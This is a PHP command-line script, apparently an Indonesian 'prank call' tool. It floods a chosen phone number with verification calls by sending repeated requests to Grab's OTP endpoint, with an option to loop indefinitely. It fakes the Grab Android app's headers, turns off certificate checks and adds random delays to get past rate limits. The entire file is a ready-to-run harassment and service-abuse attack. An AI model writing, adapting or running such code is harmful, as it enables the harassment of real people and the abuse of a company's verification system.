<?php
function get_input(){
    return trim(fgets(STDIN));
}

class PrankCall {
    private $number;
    private $headers = [];
    
    public function __construct($no) {
        $this->number = $this->validate_number($no);
    }

    private function validate_number($no) {
        $no = preg_replace('/[^0-9]/', '', $no);
        if (substr($no, 0, 1) == '0') {
            $no = '62' . substr($no, 1);
        }
        return $no;
    }

    private function generate_headers() {
        return [
            "x-request-id: " . $this->generate_uuid(),
            "User-Agent: Grab/6.39.0 (Android 13; Build " . $this->random_str(7) . ")",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept-Language: id-ID;q=1.0, en-us;q=0.9, en;q=0.8"
        ];
    }

    private function generate_uuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function random_str($length) {
        return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyz', 5)), 0, $length);
    }

    public function send_otp() {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://api.grab.com/grabid/v2/phone/otp',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                'method' => 'CALL',
                'countryCode' => 'ID',
                'phoneNumber' => $this->number,
                'templateID' => 'pax_android_production'
            ]),
            CURLOPT_HTTPHEADER => $this->generate_headers(),
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10
        ]);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return ($http_code == 200 && strpos($response, 'challengeID') !== false);
    }

    public function run() {
        echo "Jumlah percobaan (0 untuk terus menerus): ";
        $count = (int)get_input();

        $attempt = 0;
        while ($count == 0 || $attempt < $count) {
            $success = $this->send_otp();
            $attempt++;
            
            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses' : 'Gagal') . PHP_EOL;
            
            if($count != 0 && $attempt >= $count) break;
            sleep(rand(1, 3));
        }
        
        echo "Proses selesai!" . PHP_EOL;
    }
}

echo "########## PRANK CALL GRAB ##########\n";
echo "Nomor Target (contoh: 08123456789): ";
$number = get_input();

$prank = new PrankCall($number);
$prank->run();
?>
